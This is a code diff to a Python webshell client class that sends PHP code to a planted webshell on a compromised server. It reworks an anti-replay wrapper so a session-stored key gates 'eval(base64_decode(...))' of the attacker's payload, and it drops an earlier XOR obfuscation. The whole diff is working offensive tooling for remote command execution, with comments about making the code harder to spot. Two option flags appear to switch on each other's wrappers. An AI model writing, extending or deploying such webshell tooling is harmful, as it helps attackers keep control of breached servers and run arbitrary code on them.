@@ -7,6 +7,7 @@ import logging
 import random
 import string
 import functools
+import uuid
 import typing as t
 from binascii import Error as BinasciiError
 
@@ -335,6 +336,7 @@ php_webshell_conn_options = [
 
 # TODO: fix string repr, php will parse `$` in quoted strings
 # TODO: make code smaller by removing newlines, spaces and tabs
+# TODO: avoid using constant string WRONG_xxx for bad output but uuid
 
 
 class PHPWebshell(PHPSessionInterface):
@@ -677,33 +679,39 @@ class PHPWebshell(PHPSessionInterface):
 
         return wrap
 
-    def replay_stopper_wrapper(
+    def antireplay_wrapper(
         self, submitter: t.Callable[[str], t.Awaitable[str]]
     ) -> t.Callable[[str], t.Awaitable[str]]:
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
-            key = await submitter("echo($_SESSION['replay_key']=rand()%256);")
+            session_name = f"replay_key_{uuid.uuid4()}"
+            key = await submitter(f"echo($_SESSION[{session_name!r}]=rand()%10000);")
             try:
                 key = int(key)
             except Exception as exc:
                 raise exceptions.UnknownError(
-                    "部署重放防护失败，无法从服务器获得对应的key"
+                    "部署反重放失败，无法从服务器获得对应的key"
                 ) from exc
-            payload_xor = base64_encode(
-                bytes(c ^ key for c in base64_encode(payload).encode())
-            )
-            code = """
-            $payload_xor = base64_decode(PAYLOAD_XOR);
-            $arr = [];
-            for($i = 0; $i < strlen($payload_xor); $i ++) {
-                $arr[$i] = chr(ord($payload_xor[$i]) ^ $_SESSION['replay_key']);
+            payload_b64 = base64_encode(payload)
+            code = (
+                """
+            if(KEY == $_SESSION[SESSION_NAME]) {
+                eval(base64_decode(PAYLOAD_B64));
+                unset($_SESSION[SESSION_NAME]);
+            }else{
+                echo "WRONG_BAD_KEY";
             }
-            $code = implode("", $arr);
-            eval(base64_decode($code));
             """.replace(
-                "PAYLOAD_XOR", repr(payload_xor)
-            ).replace("    ", "")
+                    "SESSION_NAME", repr(session_name)
+                )
+                .replace("KEY", repr(key))
+                .replace("PAYLOAD_B64", repr(payload_b64))
+                .strip()
+                .replace("    ", "")
+            )
             result = await submitter(code)
+            if result == "WRONG_BAD_KEY":
+                raise exceptions.UnknownError("部署反重放失败，key不一致")
             return result
 
         return wrap
@@ -751,7 +759,7 @@ class PHPWebshell(PHPSessionInterface):
         # sessionize_payload
         submitter = self._submit
         if self.sessionize_payload:
-            submitter = self.replay_stopper_wrapper(submitter)
+            submitter = self.antireplay_wrapper(submitter)
         if self.antireplay:
             submitter = self.sessionize_payload_wrapper(submitter)
         return await submitter(payload)
